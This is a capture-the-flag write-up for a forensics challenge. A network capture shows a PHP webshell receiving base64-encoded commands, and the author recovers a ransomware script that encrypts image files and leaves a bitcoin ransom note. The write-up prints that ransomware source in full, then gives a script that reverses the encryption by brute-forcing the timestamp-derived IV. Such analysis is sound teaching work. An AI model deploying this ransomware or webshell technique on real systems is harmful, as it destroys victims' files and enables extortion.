### DaVinci CTF 2021 - Art galerie (23 solves) 98 points


We've got a network capture, once opened with wireshark we see lot of request, by looking at them we found that they is a Nikto scan with LOT of requests (useless for this chall)

We want to retrieve this file: flag_sur_fond_de_soleil_couchant.jpg

We have to find AES key in order to decode flag exfiltration (at tcpstream 1161)

We could also see a php webshell (at /uploads/helper.php), bad guy used to communicated with the webshell by :
```
GET /uploads/helper.php HTTP/1.1
Host: galery.art
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
;cm0gdGVzdC5qcGcucGhw
```
`cm0gdGVzdC5qcGcucGhw = rm test.jpg.php`

By follow all commands we could retrieve a python script named ransom_v1.py:
```python=
#!/usr/bin/python3
from Crypto.Cipher import AES
import time, os
from hashlib import md5

BS = 128
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode("utf-8")
key = b"RLY_SECRET_KEY_!"
iv = md5((b"%d" % time.time()).zfill(16)).digest()

cipher = AES.new(key, AES.MODE_CBC, iv)

files = os.listdir(".")

for file in files:
    ext = file.split(".")[-1]
    if os.path.isdir(file) != True and (ext == "png" or ext == "jpg"):
    with open(file, "rb") as f:
        data = f.read()
        with open(file, "wb") as f:
            f.write(cipher.encrypt(pad(data)))
        
with open("RANSOM_README.txt","wb") as f:
    f.write(b"""All your works of art have been encrypted with military grade encryption ! To recover them, please send 1000000000 bitcoins to 12nMSc17YjeD6fSQDjab8yfmV7b6qbKRS9
Do not try to find me (I use VPN and d4rkn3t to hide my ass :D) !!""")
```

We need to find the timestamp when the script was executed, by looking into commands passed to the webshell we could find this one:
python3 ./ransom_v1.py 
`at Thu, 28 Jan 2021 14:35:09 GMT
timestamp = 1611844509`

```python=
#!/usr/bin/python3
#!/usr/bin/python3
from Crypto.Cipher import AES
import time, os
from hashlib import md5

time = 1611844509  #Timestamp ./ransom_v1.py
t = b"\xff\xd8" #2 first byte of a .jpg file header
BS = 128
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode("utf-8")
key = b"RLY_SECRET_KEY_!"
data = open("flag_sur_fond_de_soleil_couchant.jpg", "rb").read()
    
out = None
iv = md5((b"%d" % (time)).zfill(16)).digest()
cipher = AES.new(key, AES.MODE_CBC, iv)
o = cipher.decrypt(pad(data))



for i in range(1000): #in case there is a mismatch with timestamp
    iv = md5((b"%d" % (time+i)).zfill(16)).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    o = cipher.decrypt(pad(data))
    if o[:2] == t:
        out=data
        print("found")
        with open("flag_sur_fond_de_soleil_couchantFinal.jpg", "wb") as f:
            f.write(o)  
        break
    
    
````
Then we retrieve a file, but not a valid .jpg file as we wanted, but we could see some few sentences that make sense, so :
` $ strings flag_sur_fond_de_soleil_couchantFinal.jpg| grep dvCTF{`

and we found the flag:

`dvCTF{t1m3_i5_n0t_r4nd0m_en0ugh}`

